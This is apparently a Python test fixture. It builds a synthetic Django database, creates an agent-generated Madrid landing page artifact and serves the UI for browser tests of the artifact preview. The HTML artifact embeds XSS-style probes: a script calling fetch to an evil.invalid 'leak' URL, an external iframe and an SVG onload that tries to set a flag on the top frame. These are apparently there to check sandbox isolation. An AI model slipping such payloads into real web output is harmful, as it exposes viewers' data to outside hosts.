"""Disposable PostgreSQL + real ASGI UI fixture, with all inference forbidden."""
import base64
import hashlib
import json
import os
from pathlib import Path
import sys
import uuid

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / 'regulai'))
os.environ['DJANGO_SETTINGS_MODULE'] = 'regulai.ci_settings'
from django.conf import settings
settings.DATABASES['default'].update(HOST='127.0.0.1', PORT='55468')
settings.DATABASES['default']['TEST']['NAME'] = 'test_regulai_p1_browser'
settings.DEBUG = True
settings.ALLOWED_HOSTS = ['127.0.0.1', 'localhost']
settings.REGULAY_AGENT_ENABLED = True
settings.REGULAY_SKILLS_CATALOG = settings.REGULAY_SKILLS_RUNTIME = True
settings.REGULAY_AGENT_TEXT_STREAM = settings.REGULAY_ARTIFACT_PREVIEW = True
settings.SESSION_COOKIE_NAME = 'p1_synthetic_session'
settings.CSRF_COOKIE_NAME = 'p1_synthetic_csrf'
settings.MIDDLEWARE = ['regulai.ui_lab_guard.RejectLabGeneration', *settings.MIDDLEWARE]


def main():
    import django
    django.setup()
    from django.db import connection
    from django.core.management import call_command
    database = connection.creation.create_test_db(verbosity=0, autoclobber=True, serialize=False)
    if database != 'test_regulai_p1_browser':
        raise RuntimeError('isolated_database_required')
    from django.contrib.auth.models import User
    from django.test import Client
    from django.utils import timezone
    from front.models import (Company, Profile, Engine, EngineModel, CompanyEngine, ObfuscationConfig,
        AgentModelProfile, AgentAccessGrant, AgentArtifact, AgentInput, AgentExecution, Conversation, Message, Prompt, Response)
    from front.agents.capabilities import GENERAL
    from front.agents.skill_installation import install
    from front.agents import jobs
    from front.agents.service import _context
    from front.policy import digest
    company = Company.objects.create(name='Laboratorio P1 · datos sintéticos')
    user = User.objects.create_user('p1-ui', password='p1-synthetic-only')
    Profile.objects.create(user=user, company=company)
    engine = Engine.objects.create(name='Proveedor sintético sin red', connector_type='openai', base_url='https://provider.invalid/v1')
    model = EngineModel.objects.create(engine=engine, name='Fixture P1', model_id='fixture-p1', context_window=200000,
        max_tokens=8000, input_price='1', output_price='2')
    credential = CompanyEngine.objects.create(company=company, engine=engine, api_key='synthetic-never-dispatched')
    mask = ObfuscationConfig.objects.create(company=company, name='Local', backend='local', detect='both')
    company.ai_config = {'version':1,'local_sensitivity':'internal','allow_empty_rules':True,
        'classification':'local','verification':{'mode':'local'},'masking':{'max_call_cost':'0'},
        'destinations':{'internal':[f'engine:{credential.pk}',f'obfuscation:{mask.pk}']},'limits':{'provider_managed':True}}
    company.save()
    profile = AgentModelProfile.objects.create(company=company, name='Profesional P1', enabled=True,
        connection=credential, model=model, tools=sorted(GENERAL), professional=True)
    AgentAccessGrant.objects.create(company=company, user=user, profile=profile, enabled=True)
    first = install(user, uuid.uuid4(), {'source':'catalog','candidate':'frontend-design'})
    if first['state'] != 'installed': raise RuntimeError(first)
    conversation = Conversation.objects.create(user=user, mode='agent', title='Madrid · página y revisión')
    # The preceding nodes are intentionally numerous, for DOM stability tests.
    for index in range(100):
        Message.objects.create(conversation=conversation, role='user', content=f'Contexto sintético {index+1}: conserva el alcance.')
        Message.objects.create(conversation=conversation, role='assistant', content=f'Dato de contexto {index+1} registrado en este fixture.')
    request_id = uuid.uuid4()
    result = jobs.enqueue(user, {}, conversation, 'Crea una landing de Madrid y entrega el HTML.', request_id)
    if result.http_status != 202: raise RuntimeError(result.data)
    run = AgentExecution.objects.get(pk=result.data['agent']['id'])
    source = AgentInput.objects.get(pk=run.job['manifest'])
    html = ('<!doctype html><html lang="es"><head><meta charset="utf-8"><style>body{font-family:system-ui;margin:0;background:#f3f5ff;color:#142340}main{padding:48px 32px}h1{font-size:48px}button{padding:12px 20px;background:#635bff;color:white;border:0;border-radius:8px}</style></head>'
        '<body><main><p>MADRID · OCTUBRE 2026</p><h1>Una ciudad para descubrir.</h1><p>Calles con historia, espacios para encontrarnos.</p><button>Explorar Madrid</button></main>'
        '<script>top.__p1PreviewEscape=true;fetch("https://evil.invalid/leak")</script>'
        '<iframe src="https://evil.invalid/frame"></iframe><svg height="0" onload="top.__p1PreviewEscape=true"><use href="https://evil.invalid/icon"/></svg></body></html>').encode()
    sha = hashlib.sha256(html).hexdigest()
    artifact = AgentArtifact.objects.create(execution=run, source=source, operation_id=uuid.uuid4(), revision=1,
        format='html', filename='madrid_landing.html', size_bytes=len(html), status='verified',
        content=base64.b64encode(html).decode(), sha256=sha, verification={'sha256':sha,'contract':'professional-v2',
        'purpose':'deliverable','automated_passed':True,'coverage':{'status':'complete'}})
    answer = 'He preparado la página de Madrid. Puedes abrir el HTML o descargar esta revisión.\n\n| Revisión | Archivo |\n|---|---|\n| 1 | madrid_landing.html |\n\n```css\nbody { background: #f3f5ff; }\n```'
    assistant = Message.objects.create(conversation=conversation, role='assistant', content=answer)
    Response.objects.create(prompt=run.prompt, assistant_message=assistant, content=answer,
        evidence={'artifacts':[{'artifact_id':str(artifact.pk)}]})
    from front.agents.delivery import receipt
    run.prompt.decision['delivery'] = receipt(run,[artifact],_context(run.prompt,run.profile_id))
    run.prompt.decision['total'] = {'complete':True,'known_cost':'0','cost':'0','attempts':0,'currency':'USD'}
    run.prompt.save()
    run.started_at=run.created_at
    run.save()
    jobs._terminal(run,'completed')
    client=Client();client.force_login(user)
    cookie=client.cookies[settings.SESSION_COOKIE_NAME].value
    report={'url':'http://127.0.0.1:8871','conversation':conversation.pk,'run':str(run.pk),
        'artifact':str(artifact.pk),'session_cookie':cookie,'cookie_name':settings.SESSION_COOKIE_NAME,
        'database':database,'fixture':True,'provider_requests':0}
    (ROOT/'output/p1-20261016/ui-lab.json').write_text(json.dumps(report,indent=2),encoding='utf-8')
    print(json.dumps({k:v for k,v in report.items() if k!='session_cookie'}),flush=True)
    import uvicorn
    from django.core.asgi import get_asgi_application
    from django.contrib.staticfiles.handlers import ASGIStaticFilesHandler
    try:
        uvicorn.run(ASGIStaticFilesHandler(get_asgi_application()),host='127.0.0.1',port=8871,log_level='warning')
    finally:
        connection.creation.destroy_test_db(old_database_name='postgres',verbosity=0)


if __name__=='__main__': main()
